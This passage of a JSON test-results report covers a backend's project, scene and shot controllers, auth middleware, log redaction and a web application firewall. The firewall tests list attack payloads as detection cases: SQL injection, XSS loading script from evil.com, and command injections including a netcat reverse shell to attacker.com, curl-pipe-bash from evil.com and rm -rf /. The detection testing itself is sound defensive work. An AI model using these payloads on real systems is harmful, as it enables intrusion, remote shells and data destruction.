missing","duration":0.5669000000000324,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["createProject"],"fullName":"createProject should create project with valid data","status":"passed","title":"should create project with valid data","duration":1.7939000000000078,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["createProject"],"fullName":"createProject should validate project data","status":"passed","title":"should validate project data","duration":0.7478000000000407,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["updateProject"],"fullName":"updateProject should update project with valid data","status":"passed","title":"should update project with valid data","duration":0.40550000000001774,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["updateProject"],"fullName":"updateProject should return 401 for unauthorized user","status":"passed","title":"should return 401 for unauthorized user","duration":0.4241999999999848,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["updateProject"],"fullName":"updateProject should return 400 when project ID is missing","status":"passed","title":"should return 400 when project ID is missing","duration":0.24250000000000682,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["updateProject"],"fullName":"updateProject should validate update data","status":"passed","title":"should validate update data","duration":0.6379999999999768,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deleteProject"],"fullName":"deleteProject should delete project successfully","status":"passed","title":"should delete project successfully","duration":0.22469999999998436,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deleteProject"],"fullName":"deleteProject should return 401 for unauthorized user","status":"passed","title":"should return 401 for unauthorized user","duration":0.20680000000004384,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deleteProject"],"fullName":"deleteProject should return 400 when project ID is missing","status":"passed","title":"should return 400 when project ID is missing","duration":0.17390000000000327,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["analyzeScript"],"fullName":"analyzeScript should analyze script successfully","status":"passed","title":"should analyze script successfully","duration":0.20240000000001146,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["analyzeScript"],"fullName":"analyzeScript should return 401 for unauthorized user","status":"passed","title":"should return 401 for unauthorized user","duration":0.18540000000001555,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["analyzeScript"],"fullName":"analyzeScript should return 400 when project ID is missing","status":"passed","title":"should return 400 when project ID is missing","duration":0.13479999999998427,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420596858,"endTime":1778420596869.1853,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/controllers/projects.controller.test.ts"},{"assertionResults":[{"ancestorTitles":["getScenes"],"fullName":"getScenes should return scenes for authorized user","status":"passed","title":"should return scenes for authorized user","duration":2.768799999999999,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getScenes"],"fullName":"getScenes should return 401 for unauthorized user","status":"passed","title":"should return 401 for unauthorized user","duration":0.6566000000000258,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getScenes"],"fullName":"getScenes should return 400 when project ID is missing","status":"passed","title":"should return 400 when project ID is missing","duration":0.44020000000000437,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getScene"],"fullName":"getScene should return scene for authorized user","status":"passed","title":"should return scene for authorized user","duration":0.3394000000000119,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getScene"],"fullName":"getScene should return 401 for unauthorized user","status":"passed","title":"should return 401 for unauthorized user","duration":0.36400000000003274,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getScene"],"fullName":"getScene should return 400 when scene ID is missing","status":"passed","title":"should return 400 when scene ID is missing","duration":0.49490000000002965,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["createScene"],"fullName":"createScene should create scene with valid data","status":"passed","title":"should create scene with valid data","duration":2.0704000000000065,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["createScene"],"fullName":"createScene should return 401 for unauthorized user","status":"passed","title":"should return 401 for unauthorized user","duration":0.26490000000001146,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["createScene"],"fullName":"createScene should validate scene data","status":"passed","title":"should validate scene data","duration":1.0649000000000228,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["updateScene"],"fullName":"updateScene should update scene with valid data","status":"passed","title":"should update scene with valid data","duration":0.5048999999999637,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["updateScene"],"fullName":"updateScene should return 401 for unauthorized user","status":"passed","title":"should return 401 for unauthorized user","duration":0.2644000000000233,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["updateScene"],"fullName":"updateScene should return 400 when scene ID is missing","status":"passed","title":"should return 400 when scene ID is missing","duration":0.1896000000000413,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["updateScene"],"fullName":"updateScene should validate update data","status":"passed","title":"should validate update data","duration":0.39879999999999427,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deleteScene"],"fullName":"deleteScene should delete scene successfully","status":"passed","title":"should delete scene successfully","duration":0.16289999999997917,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deleteScene"],"fullName":"deleteScene should return 401 for unauthorized user","status":"passed","title":"should return 401 for unauthorized user","duration":0.14289999999999736,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deleteScene"],"fullName":"deleteScene should return 400 when scene ID is missing","status":"passed","title":"should return 400 when scene ID is missing","duration":0.12449999999995498,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420594278,"endTime":1778420594289.1245,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/controllers/scenes.controller.test.ts"},{"assertionResults":[{"ancestorTitles":["getShots"],"fullName":"getShots يعيد اللقطات المرتبطة بالمشهد للمستخدم المصرح له","status":"passed","title":"يعيد اللقطات المرتبطة بالمشهد للمستخدم المصرح له","duration":2.967899999999986,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getShots"],"fullName":"getShots يعيد 401 عند غياب المستخدم","status":"passed","title":"يعيد 401 عند غياب المستخدم","duration":0.4252999999999929,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getShots"],"fullName":"getShots يعيد 404 عندما يفشل التحقق من ملكية المشهد","status":"passed","title":"يعيد 404 عندما يفشل التحقق من ملكية المشهد","duration":0.4613000000000511,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getShot"],"fullName":"getShot يعيد لقطة واحدة بعد التحقق من الملكية","status":"passed","title":"يعيد لقطة واحدة بعد التحقق من الملكية","duration":0.5912000000000148,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["getShot"],"fullName":"getShot يعيد 404 عندما لا تكون اللقطة متاحة أو غير مملوكة","status":"passed","title":"يعيد 404 عندما لا تكون اللقطة متاحة أو غير مملوكة","duration":0.4789000000000101,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["createShot"],"fullName":"createShot ينشئ لقطة جديدة بالبيانات الصحيحة ويحدّث عدد اللقطات","status":"passed","title":"ينشئ لقطة جديدة بالبيانات الصحيحة ويحدّث عدد اللقطات","duration":1.4066000000000258,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["createShot"],"fullName":"createShot يعيد 400 عندما تفشل مصادقة البيانات","status":"passed","title":"يعيد 400 عندما تفشل مصادقة البيانات","duration":0.8850999999999658,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["createShot"],"fullName":"createShot يعيد 500 إذا لم تُرجع قاعدة البيانات لقطة مُنشأة","status":"passed","title":"يعيد 500 إذا لم تُرجع قاعدة البيانات لقطة مُنشأة","duration":0.3353999999999928,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["updateShot"],"fullName":"updateShot يحدّث اللقطة عند تحقق الملكية وصحة البيانات","status":"passed","title":"يحدّث اللقطة عند تحقق الملكية وصحة البيانات","duration":0.6347999999999843,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["updateShot"],"fullName":"updateShot يعيد 400 عند بيانات تحديث غير صالحة","status":"passed","title":"يعيد 400 عند بيانات تحديث غير صالحة","duration":0.5534999999999854,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["updateShot"],"fullName":"updateShot يعيد 404 عندما لا تكون اللقطة متاحة للتعديل","status":"passed","title":"يعيد 404 عندما لا تكون اللقطة متاحة للتعديل","duration":0.43339999999994916,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deleteShot"],"fullName":"deleteShot يحذف اللقطة ويحدّث عدّاد المشهد","status":"passed","title":"يحذف اللقطة ويحدّث عدّاد المشهد","duration":0.39510000000001355,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["deleteShot"],"fullName":"deleteShot يعيد 404 عندما لا تكون اللقطة متاحة للحذف","status":"passed","title":"يعيد 404 عندما لا تكون اللقطة متاحة للحذف","duration":0.18090000000000828,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["generateShotSuggestion"],"fullName":"generateShotSuggestion يولد اقتراح لقطة عبر خدمة Gemini","status":"passed","title":"يولد اقتراح لقطة عبر خدمة Gemini","duration":0.30989999999997053,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["generateShotSuggestion"],"fullName":"generateShotSuggestion يعيد 400 عندما تنقص مدخلات اقتراح اللقطة","status":"passed","title":"يعيد 400 عندما تنقص مدخلات اقتراح اللقطة","duration":0.3620999999999981,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420597263,"endTime":1778420597274.362,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/controllers/shots.controller.test.ts"},{"assertionResults":[{"ancestorTitles":["Route isolation"],"fullName":"Route isolation brainstorm route path does not overlap with workflow routes","status":"passed","title":"brainstorm route path does not overlap with workflow routes","duration":1.436099999999982,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Route isolation"],"fullName":"Route isolation workflow routes all share the /api/workflow prefix","status":"passed","title":"workflow routes all share the /api/workflow prefix","duration":0.19580000000001974,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Route isolation"],"fullName":"Route isolation brainstorm path does not start with /api/workflow","status":"passed","title":"brainstorm path does not start with /api/workflow","duration":0.08299999999999841,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420675179,"endTime":1778420675181.1958,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/controllers/workflow.controller.test.ts"},{"assertionResults":[{"ancestorTitles":[],"fullName":"loads file URL modules with spaces from the CommonJS helper","status":"passed","title":"loads file URL modules with spaces from the CommonJS helper","duration":4.8448999999999955,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":[],"fullName":"resolves the editor runtime next to the backend working directory in bundled containers","status":"passed","title":"resolves the editor runtime next to the backend working directory in bundled containers","duration":0.45029999999997017,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420608709,"endTime":1778420608714.4502,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/editor/native-dynamic-import.test.ts"},{"assertionResults":[{"ancestorTitles":["authMiddleware","Token from Authorization header"],"fullName":"authMiddleware Token from Authorization header should successfully authenticate with valid Bearer token","status":"passed","title":"should successfully authenticate with valid Bearer token","duration":4.05359999999996,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["authMiddleware","Token from Authorization header"],"fullName":"authMiddleware Token from Authorization header should return 401 if Authorization header is missing Bearer prefix","status":"passed","title":"should return 401 if Authorization header is missing Bearer prefix","duration":1.2134000000000356,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["authMiddleware","Token from Cookie"],"fullName":"authMiddleware Token from Cookie should successfully authenticate with valid cookie token","status":"passed","title":"should successfully authenticate with valid cookie token","duration":0.7036000000000513,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["authMiddleware","Token from Cookie"],"fullName":"authMiddleware Token from Cookie should prioritize Authorization header over cookie","status":"passed","title":"should prioritize Authorization header over cookie","duration":0.5275000000000318,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["authMiddleware","Error cases"],"fullName":"authMiddleware Error cases should return 401 if no token provided","status":"passed","title":"should return 401 if no token provided","duration":0.5143999999999664,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["authMiddleware","Error cases"],"fullName":"authMiddleware Error cases should return 401 if token verification fails","status":"passed","title":"should return 401 if token verification fails","duration":0.48790000000002465,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["authMiddleware","Error cases"],"fullName":"authMiddleware Error cases should return 401 if user not found","status":"passed","title":"should return 401 if user not found","duration":0.32920000000001437,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["authMiddleware","Error cases"],"fullName":"authMiddleware Error cases should handle database errors gracefully","status":"passed","title":"should handle database errors gracefully","duration":0.41509999999999536,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["authMiddleware","Edge cases"],"fullName":"authMiddleware Edge cases should handle undefined cookies object","status":"passed","title":"should handle undefined cookies object","duration":0.5389999999999873,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["authMiddleware","Edge cases"],"fullName":"authMiddleware Edge cases should handle empty string token","status":"passed","title":"should handle empty string token","duration":0.29920000000004165,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420599092,"endTime":1778420599102.2993,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/middleware/auth.middleware.test.ts"},{"assertionResults":[{"ancestorTitles":["setupMiddleware"],"fullName":"setupMiddleware should apply all middleware layers to Express app","status":"passed","title":"should apply all middleware layers to Express app","duration":3.8455000000000155,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["errorHandler"],"fullName":"errorHandler should handle 4xx client errors with appropriate status code","status":"passed","title":"should handle 4xx client errors with appropriate status code","duration":2.4460000000000264,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["errorHandler"],"fullName":"errorHandler should handle 500 server errors with generic message","status":"passed","title":"should handle 500 server errors with generic message","duration":0.6816000000000031,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["errorHandler"],"fullName":"errorHandler should log errors with request context","status":"passed","title":"should log errors with request context","duration":0.21619999999995798,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["errorHandler"],"fullName":"errorHandler should extract error code from error object when available","status":"passed","title":"should extract error code from error object when available","duration":0.356899999999996,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["errorHandler"],"fullName":"errorHandler should handle 403 forbidden errors","status":"passed","title":"should handle 403 forbidden errors","duration":0.2865000000000464,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["errorHandler"],"fullName":"errorHandler should handle 401 unauthorized errors","status":"passed","title":"should handle 401 unauthorized errors","duration":0.2758999999999787,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["createPerUserLimiter"],"fullName":"createPerUserLimiter should return Express middleware function","status":"passed","title":"should return Express middleware function","duration":0.4615999999999758,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["createPerUserLimiter"],"fullName":"createPerUserLimiter should create limiter with custom options","status":"passed","title":"should create limiter with custom options","duration":0.6946000000000367,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["perUserAiLimiter"],"fullName":"perUserAiLimiter should be defined as a middleware function","status":"passed","title":"should be defined as a middleware function","duration":0.19310000000007221,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["perUserAiLimiter"],"fullName":"perUserAiLimiter should have correct error message in Arabic","status":"passed","title":"should have correct error message in Arabic","duration":0.14780000000007476,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["perUserWriteLimiter"],"fullName":"perUserWriteLimiter should be defined as a middleware function","status":"passed","title":"should be defined as a middleware function","duration":0.07349999999996726,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["perUserWriteLimiter"],"fullName":"perUserWriteLimiter should be configured for write operations","status":"passed","title":"should be configured for write operations","duration":0.044399999999996,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["validation middleware exports"],"fullName":"validation middleware exports should export validation utilities from index","status":"passed","title":"should export validation utilities from index","duration":0.26130000000000564,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SLO metrics exports"],"fullName":"SLO metrics exports should export SLO utilities from index","status":"passed","title":"should export SLO utilities from index","duration":0.3745000000000118,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420590235,"endTime":1778420590245.3745,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/middleware/index.test.ts"},{"assertionResults":[{"ancestorTitles":["sanitizeString"],"fullName":"sanitizeString should redact email addresses","status":"passed","title":"should redact email addresses","duration":1.769299999999987,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeString"],"fullName":"sanitizeString should redact multiple email addresses","status":"passed","title":"should redact multiple email addresses","duration":0.2699000000000069,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeString"],"fullName":"sanitizeString should redact passwords in key-value pairs","status":"passed","title":"should redact passwords in key-value pairs","duration":0.12920000000002574,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeString"],"fullName":"sanitizeString should redact passwords with different formats","status":"passed","title":"should redact passwords with different formats","duration":0.4268000000000143,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeString"],"fullName":"sanitizeString should redact JWT tokens","status":"passed","title":"should redact JWT tokens","duration":0.20240000000001146,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeString"],"fullName":"sanitizeString should redact API keys","status":"passed","title":"should redact API keys","duration":0.200300000000027,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeString"],"fullName":"sanitizeString should redact credit card numbers","status":"passed","title":"should redact credit card numbers","duration":0.23149999999998272,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeString"],"fullName":"sanitizeString should redact US SSN","status":"passed","title":"should redact US SSN","duration":0.15879999999998518,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeString"],"fullName":"sanitizeString should redact phone numbers","status":"passed","title":"should redact phone numbers","duration":0.3318999999999619,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeString"],"fullName":"sanitizeString should redact authorization headers","status":"passed","title":"should redact authorization headers","duration":0.15070000000002892,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeString"],"fullName":"sanitizeString should handle multiple PII types in one string","status":"passed","title":"should handle multiple PII types in one string","duration":0.16259999999999764,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeString"],"fullName":"sanitizeString should not modify strings without PII","status":"passed","title":"should not modify strings without PII","duration":0.0625,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeObject"],"fullName":"sanitizeObject should sanitize nested object with email","status":"passed","title":"should sanitize nested object with email","duration":0.24900000000002365,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeObject"],"fullName":"sanitizeObject should redact entire password fields","status":"passed","title":"should redact entire password fields","duration":0.13369999999997617,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeObject"],"fullName":"sanitizeObject should redact sensitive field names","status":"passed","title":"should redact sensitive field names","duration":0.18110000000001492,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeObject"],"fullName":"sanitizeObject should sanitize arrays of objects","status":"passed","title":"should sanitize arrays of objects","duration":0.17830000000003565,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeObject"],"fullName":"sanitizeObject should handle deeply nested objects","status":"passed","title":"should handle deeply nested objects","duration":0.0835999999999899,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeObject"],"fullName":"sanitizeObject should handle null and undefined values","status":"passed","title":"should handle null and undefined values","duration":0.07589999999999009,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["sanitizeObject"],"fullName":"sanitizeObject should sanitize mixed types in arrays","status":"passed","title":"should sanitize mixed types in arrays","duration":0.12649999999996453,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["PII_PATTERNS"],"fullName":"PII_PATTERNS should have all necessary PII patterns defined","status":"passed","title":"should have all necessary PII patterns defined","duration":0.7841999999999985,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["PII_PATTERNS"],"fullName":"PII_PATTERNS should all patterns have valid RegExp","status":"passed","title":"should all patterns have valid RegExp","duration":0.4175000000000182,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Real-world scenarios"],"fullName":"Real-world scenarios should sanitize typical login request log","status":"passed","title":"should sanitize typical login request log","duration":0.1671999999999798,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Real-world scenarios"],"fullName":"Real-world scenarios should sanitize error logs with user info","status":"passed","title":"should sanitize error logs with user info","duration":0.13750000000004547,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Real-world scenarios"],"fullName":"Real-world scenarios should sanitize Gemini API request with token","status":"passed","title":"should sanitize Gemini API request with token","duration":0.08240000000000691,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420603530,"endTime":1778420603537.1375,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/middleware/log-sanitization.middleware.test.ts"},{"assertionResults":[{"ancestorTitles":["Basic Functionality"],"fullName":"Basic Functionality should allow legitimate requests","status":"passed","title":"should allow legitimate requests","duration":7.318900000000042,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Basic Functionality"],"fullName":"Basic Functionality should skip WAF when disabled","status":"passed","title":"should skip WAF when disabled","duration":0.7094999999999914,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Basic Functionality"],"fullName":"Basic Functionality should allow whitelisted paths","status":"passed","title":"should allow whitelisted paths","duration":0.4514000000000351,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Basic Functionality"],"fullName":"Basic Functionality should allow whitelisted IPs","status":"passed","title":"should allow whitelisted IPs","duration":0.2804999999999609,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SQL Injection Detection"],"fullName":"SQL Injection Detection should detect SQL injection: SELECT * FROM users WHERE id=1","status":"passed","title":"should detect SQL injection: SELECT * FROM users WHERE id=1","duration":1.6557999999999993,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SQL Injection Detection"],"fullName":"SQL Injection Detection should detect SQL injection: 1' OR '1'='1","status":"passed","title":"should detect SQL injection: 1' OR '1'='1","duration":0.5690000000000168,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SQL Injection Detection"],"fullName":"SQL Injection Detection should detect SQL injection: 1; DROP TABLE users--","status":"passed","title":"should detect SQL injection: 1; DROP TABLE users--","duration":0.4375,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SQL Injection Detection"],"fullName":"SQL Injection Detection should detect SQL injection: UNION SELECT username, password FROM users","status":"passed","title":"should detect SQL injection: UNION SELECT username, password FROM users","duration":0.3836000000000013,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SQL Injection Detection"],"fullName":"SQL Injection Detection should detect SQL injection: admin'--","status":"passed","title":"should detect SQL injection: admin'--","duration":0.6665999999999599,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SQL Injection Detection"],"fullName":"SQL Injection Detection should detect SQL injection: 1' AND 1=1--","status":"passed","title":"should detect SQL injection: 1' AND 1=1--","duration":0.4227000000000203,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SQL Injection Detection"],"fullName":"SQL Injection Detection should detect SQL injection: '; EXEC xp_cmdshell('dir')--","status":"passed","title":"should detect SQL injection: '; EXEC xp_cmdshell('dir')--","duration":0.4199999999999591,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SQL Injection Detection"],"fullName":"SQL Injection Detection should detect SQL injection: 1' WAITFOR DELAY '0:0:10'--","status":"passed","title":"should detect SQL injection: 1' WAITFOR DELAY '0:0:10'--","duration":0.33389999999997144,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SQL Injection Detection"],"fullName":"SQL Injection Detection should detect SQL injection: 1' ORDER BY 1--","status":"passed","title":"should detect SQL injection: 1' ORDER BY 1--","duration":0.43139999999999645,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SQL Injection Detection"],"fullName":"SQL Injection Detection should detect SQL injection: BENCHMARK(10000000,SHA256('test'))","status":"passed","title":"should detect SQL injection: BENCHMARK(10000000,SHA256('test'))","duration":0.5178000000000225,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SQL Injection Detection"],"fullName":"SQL Injection Detection should detect SQL injection in query parameters","status":"passed","title":"should detect SQL injection in query parameters","duration":0.4009999999999536,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["XSS Detection"],"fullName":"XSS Detection should detect XSS attack: <script>alert('xss')</script>","status":"passed","title":"should detect XSS attack: <script>alert('xss')</script>","duration":0.40559999999999263,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["XSS Detection"],"fullName":"XSS Detection should detect XSS attack: <img src=x onerror=alert('xss')>","status":"passed","title":"should detect XSS attack: <img src=x onerror=alert('xss')>","duration":0.2732000000000312,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["XSS Detection"],"fullName":"XSS Detection should detect XSS attack: javascript:alert('xss')","status":"passed","title":"should detect XSS attack: javascript:alert('xss')","duration":0.22750000000002046,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["XSS Detection"],"fullName":"XSS Detection should detect XSS attack: <svg onload=alert('xss')>","status":"passed","title":"should detect XSS attack: <svg onload=alert('xss')>","duration":0.21170000000000755,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["XSS Detection"],"fullName":"XSS Detection should detect XSS attack: <body onload=alert('xss')>","status":"passed","title":"should detect XSS attack: <body onload=alert('xss')>","duration":0.21710000000001628,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["XSS Detection"],"fullName":"XSS Detection should detect XSS attack: <iframe src='javascript:alert(1)'>","status":"passed","title":"should detect XSS attack: <iframe src='javascript:alert(1)'>","duration":0.3605999999999767,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["XSS Detection"],"fullName":"XSS Detection should detect XSS attack: <div style='background:url(javascript:alert(1))'>","status":"passed","title":"should detect XSS attack: <div style='background:url(javascript:alert(1))'>","duration":0.24330000000003338,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["XSS Detection"],"fullName":"XSS Detection should detect XSS attack: '-alert(1)-'","status":"passed","title":"should detect XSS attack: '-alert(1)-'","duration":0.23910000000000764,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["XSS Detection"],"fullName":"XSS Detection should detect XSS attack: <script src='https://evil.com/xss.js'></script>","status":"passed","title":"should detect XSS attack: <script src='https://evil.com/xss.js'></script>","duration":0.8758000000000266,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Command Injection Detection"],"fullName":"Command Injection Detection should detect command injection: ; cat /etc/passwd","status":"passed","title":"should detect command injection: ; cat /etc/passwd","duration":0.3206000000000131,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Command Injection Detection"],"fullName":"Command Injection Detection should detect command injection: | ls -la","status":"passed","title":"should detect command injection: | ls -la","duration":0.21739999999999782,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Command Injection Detection"],"fullName":"Command Injection Detection should detect command injection: `whoami`","status":"passed","title":"should detect command injection: `whoami`","duration":0.170599999999979,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Command Injection Detection"],"fullName":"Command Injection Detection should detect command injection: $(id)","status":"passed","title":"should detect command injection: $(id)","duration":0.19849999999996726,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Command Injection Detection"],"fullName":"Command Injection Detection should detect command injection: && rm -rf /","status":"passed","title":"should detect command injection: && rm -rf /","duration":0.165300000000002,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Command Injection Detection"],"fullName":"Command Injection Detection should detect command injection: || ping -c 10 evil.com","status":"passed","title":"should detect command injection: || ping -c 10 evil.com","duration":0.16929999999996426,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Command Injection Detection"],"fullName":"Command Injection Detection should detect command injection: ; nc -e /bin/sh attacker.com 4444","status":"passed","title":"should detect command injection: ; nc -e /bin/sh attacker.com 4444","duration":0.19990000000001373,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Command Injection Detection"],"fullName":"Command Injection Detection should detect command injection: | curl https://evil.com/shell.sh | bash","status":"passed","title":"should detect command injection: | curl https://evil.com/shell.sh | bash","duration":0.3091999999999757,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Path Traversal Detection"],"fullName":"Path Traversal Detection should detect path traversal: ../../../etc/passwd","status":"passed","title":"should detect path traversal: ../../../etc/passwd","duration":0.34000000000003183,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Path Traversal Detection"],"fullName":"Path Traversal Detection should detect path traversal: ..\\..\\..\\windows\\system32\\config\\sam","status":"passed","title":"should detect path traversal: ..\\..\\..\\windows\\system32\\config\\sam","duration":0.3383000000000038,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Path Traversal Detection"],"fullName":"Path Traversal Detection should detect path traversal: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","status":"passed","title":"should detect path traversal: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","duration":0.29980000000000473,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Path Traversal Detection"],"fullName":"Path Traversal Detection should detect path traversal: 